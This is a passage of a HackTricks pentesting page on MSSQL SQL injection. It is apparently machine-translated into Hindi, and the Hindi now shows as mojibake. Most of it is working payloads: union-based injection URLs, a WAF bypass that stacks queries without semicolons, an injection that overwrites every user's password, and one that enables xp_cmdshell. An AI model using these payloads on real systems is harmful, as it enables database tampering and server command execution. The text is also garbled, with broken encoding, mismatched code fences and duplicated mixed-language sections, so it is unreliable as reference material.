#### рдпреВрдирд┐рдпрди-рдЖрдзрд╛рд░рд┐рдд SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди

MSSQL рдбреЗрдЯрд╛рдмреЗрд╕ рдкрд░ рдпреВрдирд┐рдпрди-рдЖрдзрд╛рд░рд┐рдд SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд URL рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
```

\N separator between SELECT and a throwaway column:

```
### MSSQL Injection

#### Union-Based SQL Injection

To perform a union-based SQL injection on a MSSQL database, you can use the following payload in the vulnerable parameter:

```plaintext
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

#### рдпреВрдирд┐рдпрди-рдЖрдзрд╛рд░рд┐рдд SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди

MSSQL рдбреЗрдЯрд╛рдмреЗрд╕ рдкрд░ рдпреВрдирд┐рдпрди-рдЖрдзрд╛рд░рд┐рдд SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
```sql
SELECT 'a' SELECT 'b'
```
```

So for example, multiple queries such as:

```sql
```
рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдХреЛрдб:
```
```

Can be reduced to:

```sql
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# рдПрдХ рдЕрдирд░реНрдердХ exec() рдЬреЛрдбрд╝реЗрдВ рдФрд░ WAF рдХреЛ рдпрд╣ рдорд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдПрдВ рдХрд┐ рдпрд╣ рдПрдХ рдорд╛рдиреНрдп рдХреНрд╡реЗрд░реА рдирд╣реАрдВ рд╣реИ
admina'union select 1,'admin','testtest123'exec('select 1')--
## рдпрд╣ рд╣реЛрдЧрд╛:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# рдЕрдЬреАрдм рдврдВрдЧ рд╕реЗ рдмрдирд╛рдИ рдЧрдИ рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛
admin'exec('update[users]set[password]=''a''')--
## рдпрд╣ рд╣реЛрдЧрд╛:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# рдпрд╛ xp_cmdshell рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## рдпрд╣ рд╣реЛрдЧрд╛
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
